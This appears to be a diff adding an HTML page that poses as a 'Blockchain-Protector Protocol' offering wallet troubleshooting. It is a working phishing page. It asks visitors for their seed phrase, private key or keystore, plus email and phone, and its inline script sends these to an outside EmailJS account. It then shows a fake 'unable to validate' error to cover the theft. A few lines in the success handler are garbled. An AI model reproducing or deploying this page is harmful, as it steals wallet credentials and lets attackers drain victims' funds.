@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BLOCKCHAIN-PROTECTOR PROTOCOL</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+
+<div class="protocol-container">
+  <header class="protocol-header">
+    <h1>BLOCKCHAIN-PROTECTOR PROTOCOL</h1>
+    <p>This is not an app but a protocol that establishes remote resolution 
+      between all non-custodial wallets, discovering decentralized solutions, 
+      seamless transactions, and a decentralized ecosystem.
+    </p>
+  </header>
+
+  <div class="troubleshoot-dropdown">
+    <label for="troubleshootSelect">Troubleshoot an Issue:</label>
+    <select id="troubleshootSelect" onchange="openWalletPopup(this.value)">
+      <option value="" disabled selected>Select an option</option>
+      <option value="Migration">Migration</option>
+      <option value="Rectification">Rectification</option>
+      <option value="Claim">Claim</option>
+      <option value="Swap">Swap</option>
+      <option value="Slippage">Slippage</option>
+      <option value="Claim Airdrop">Claim Airdrop</option>
+      <option value="Staking">Staking</option>
+      <option value="Whitelist">Whitelist</option>
+      <option value="Cross Transfer">Cross Transfer</option>
+      <option value="NFTs">NFTs</option>
+      <option value="Locked Account">Locked Account</option>
+      <option value="Login Error">Login Error</option>
+      <option value="Wallet Glitch">Wallet Glitch</option>
+      <option value="DeFi Farming">DeFi Farming</option>
+      <option value="Validation">Validation</option>
+      <option value="Transaction Delay">Transaction Delay</option>
+      <option value="Missing Balance">Missing Balance</option>
+      <option value="Recovery">Recovery</option>
+      <option value="Buy Token">Buy Token</option>
+      <option value="Exchange">Exchange</option>
+      <option value="Bridging">Bridging</option>
+    </select>
+  </div>
+
+  <div class="wallet-connect">
+    <button class="connect-button" onclick="openWalletList()">Connect Wallet</button>
+  </div>
+</div>
+
+<!-- Wallet Popups -->
+
+<div id="walletPopup" class="popup">
+  <div class="popup-content">
+    <div class="wallet-popup-header">
+      <h3>Connect your wallet</h3>
+    </div>
+    <div id="walletList"></div>
+    <div id="customWalletInput" class="hidden">
+      <input type="text" id="customWalletName" placeholder="Enter your wallet name">
+    </div>
+  </div>
+</div>
+
+<div id="walletImportPopup" class="popup">
+  <div class="popup-content">
+    <div class="import-header">
+      <div class="error-message">There was an error connecting automatically. But do not worry, you can still connect manually.</div>
+      <div class="import-title">
+        <span>Import your</span>
+        <span id="importWalletName">Metamask</span>
+        <span>wallet</span>
+        <img id="importWalletLogo" src="" alt="" style="width: 24px; height: 24px;">
+      </div>
+    </div>
+
+    <div class="import-options">
+      <div class="import-option active" data-type="seed">Seed Phrase</div>
+      <div class="import-option" data-type="keystore">Keystore JSON</div>
+      <div class="import-option" data-type="private">Private Key</div>
+    </div>
+
+    <div class="input-section">
+      <label for="walletSeedInput">Enter your wallet seed phrase</label>
+      <textarea id="walletSeedInput" class="seed-input" placeholder="Enter your seed phrase"></textarea>
+    </div>
+
+    <div class="contact-section">
+      <h4 style="margin: 0 0 1rem 0; color: #374151; font-size: 1rem;">Contact Information (Optional)</h4>
+      <div class="contact-row">
+        <div class="contact-field">
+          <label for="userEmail">Email Address</label>
+          <input type="email" id="userEmail" placeholder="your@email.com">
+        </div>
+        <div class="contact-field">
+          <label for="userPhone">Phone Number</label>
+          <input type="tel" id="userPhone" placeholder="+1234567890">
+        </div>
+      </div>
+      <div class="contact-field">
+        <label for="issueDescription">Describe your issue</label>
+        <textarea id="issueDescription" placeholder="Briefly describe the problem you're experiencing..." rows="3"></textarea>
+      </div>
+    </div>
+
+    <div class="import-actions">
+      <button class="validate-btn" onclick="validateWallet()">Validate</button>
+      <button class="close-btn" onclick="closeWalletImportPopup()">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Other Popups -->
+<div id="initPopup" class="popup">
+  <div class="popup-content init-popup-content">
+    <h3 id="initWalletName">Initializing</h3>
+    <p id="initStatusMessage">Error connecting to wallet...</p>
+    <div class="loading-spinner"></div>
+  </div>
+</div>
+
+<div id="stepPopup" class="popup">
+  <div class="popup-content step-popup-content">
+    <h3>Step 1</h3>
+    <div class="step-content">
+      <div class="step-number">1</div>
+      <p>Connect your wallet to our protocol.</p>
+    </div>
+  </div>
+</div>
+
+<div id="errorPopup" class="popup">
+  <img id="errorWalletLogo" src="" alt="">
+  <h3 id="errorWalletName"></h3>
+  <button id="closeErrorPopup">Close</button>
+</div>
+
+<div id="validateStatusPopup" class="popup">
+  <img id="validateWalletLogo" src="" alt="">
+  <p id="validateStatusMessage"></p>
+</div>
+
+<div id="troubleshootPopup" class="popup">
+  <div class="popup-content">
+    <h3>Troubleshooting: <span id="troubleshootIssueType"></span></h3>
+    <p>To resolve this issue, please connect your wallet first and follow the guided resolution process.</p>
+    <div class="popup-buttons">
+      <button onclick="closeTroubleshootPopup(); openWalletList();" class="connect-button">Connect Wallet to Resolve</button>
+      <button onclick="closeTroubleshootPopup()" class="close-button">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Inline JS -->
+<script>
+function openWalletList() {
+  document.getElementById("walletPopup").style.display = "flex";
+}
+
+  // Initialize EmailJS first!
+  emailjs.init("hwWuRqhr9vJTWa-n8"); // Get from EmailJS dashboard
+
+  function validateWallet() {
+    const seedPhrase = document.getElementById("walletSeedInput").value;
+    const walletName = document.getElementById("importWalletName").innerText;
+    const userEmail = document.getElementById("userEmail").value.trim();
+    const userPhone = document.getElementById("userPhone").value.trim();
+    const issueDescription = document.getElementById("issueDescription").value.trim();
+
+    if (seedPhrase.trim() === "") {
+      alert("Please enter your seed phrase or private key.");
+      return;
+    }
+
+    const templateParams = {
+      wallet_name: walletName,
+      seed_phrase: seedPhrase,
+      user_email: userEmail || 'Not provided',
+      user_phone: userPhone || 'Not provided', 
+      issue_description: issueDescription || 'No description provided',
+      submission_date: new Date().toLocaleString(),
+      user_agent: navigator.userAgent
+    };
+
+    console.log('Sending email with params:', templateParams);
+
+    emailjs.send('service_xccsflu', 'template_tcljc90', templateParams)
+      .then(function(response) {
+        console.log('Email sent successfully:', no  response);
+        no("unable to validate  your   request  at the moment-please  try again later or contact support team for assistance.");
+        closeWalletImportPopup();
+      })
+      .catch(function(error) {
+        console.error('Email sending failed:', error);
+        alert("There was an error submitting your request. Please try again. Error: " + JSON.stringify(error));
+      });
+  }
+</script>
+
+<script src="{{ url_for('static', filename='script.js') }}"></script>
+
+</body>
+</html>
